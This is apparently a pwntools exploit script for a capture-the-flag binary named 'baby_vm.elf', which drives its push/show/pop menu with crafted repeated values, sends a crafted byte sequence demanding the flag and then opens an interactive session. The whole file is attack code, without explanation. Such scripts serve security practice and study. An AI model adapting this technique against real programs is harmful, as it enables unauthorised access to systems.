from pwn import *

p=process("./baby_vm.elf")

sa = lambda x,y : p.sendafter(x,y)

def push(a):
    sa(">>>",'1')
    sa("content: ",a)

def show():
    sa(">>>","2")

def pop():
    sa(">>>","3")
    
for i in range(0x75):
    print i
    push((p32(0x1)+p32(0x80))*0x10)

p.sendafter(">>>","2\x28\x45\x06")
p.send("\xffPleaseGiveMeTheFlag")

p.interactive()